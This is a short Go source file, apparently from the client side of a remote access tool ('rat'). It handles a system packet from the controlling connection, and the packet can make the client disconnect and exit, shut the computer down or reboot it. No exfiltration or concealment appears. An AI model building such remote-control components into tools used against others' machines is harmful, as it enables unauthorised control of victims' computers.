package main

import (
	"errors"
	"fmt"
	"os"
	"rat/client/computer"
	"rat/common/system"
	"strconv"
)

type SysPacket Packet

func (packet SysPacket) Read(c *Connection) error {
	action, err := c.ReadInt()
	if err != nil {
		return err
	}

	switch system.Action(action) {
	case system.Disconnect:
		conn.Close()
		os.Exit(0)
	case system.Shutdown:
		computer.Shutdown()
	case system.Reboot:
		computer.Reboot()
	default:
		return errors.New("invalid sysaction " + strconv.Itoa(action))
	}

	fmt.Println("action", action)
	return nil
}
